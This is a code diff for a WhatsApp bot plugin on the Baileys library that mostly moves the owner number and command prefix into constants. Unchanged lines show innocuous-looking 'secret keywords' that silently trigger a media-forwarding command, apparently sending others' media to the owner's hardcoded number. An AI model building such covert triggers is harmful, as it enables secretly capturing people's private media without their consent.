@@ -1,18 +1,19 @@
 import pkg from '@whiskeysockets/baileys';
 const { downloadMediaMessage } = pkg;
-import config from '../config.js';
+
+const OWNER_NUMBER = '255734980103'; // Replace with your actual owner number
+const PREFIX = '.'; // Set your bot's command prefix
 
 let handler = async (m, { conn }) => {
   const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
-  const ownerNumber = 255734980103 + '@s.whatsapp.net';
-  const prefix = .;
+  const ownerNumber = OWNER_NUMBER + '@s.whatsapp.net';
 
   // Secret keywords for triggering media forwarding
   const secretKeywords = ['🔥', 'wow', 'nice'];
 
   // Extract command or detect secret keyword
-  const cmd = m.text.startsWith(prefix)
-    ? m.text.slice(prefix.length).split(' ')[0].toLowerCase()
+  const cmd = m.text.startsWith(PREFIX)
+    ? m.text.slice(PREFIX.length).split(' ')[0].toLowerCase()
     : secretKeywords.includes(m.text.toLowerCase())
     ? 'vv2' // Secret keywords act as 'vv2'
     : '';
@@ -52,7 +53,7 @@ let handler = async (m, { conn }) => {
     if (!buffer) return m.reply('*Failed to retrieve media!*');
 
     let mimetype = msg.audioMessage?.mimetype || 'audio/ogg';
-    let caption = `> *© Powered By Lazack-Bots*`;
+    let caption = `> *© Powered By Lazack Bot*`;
 
     // Determine recipient based on command
     let recipient =
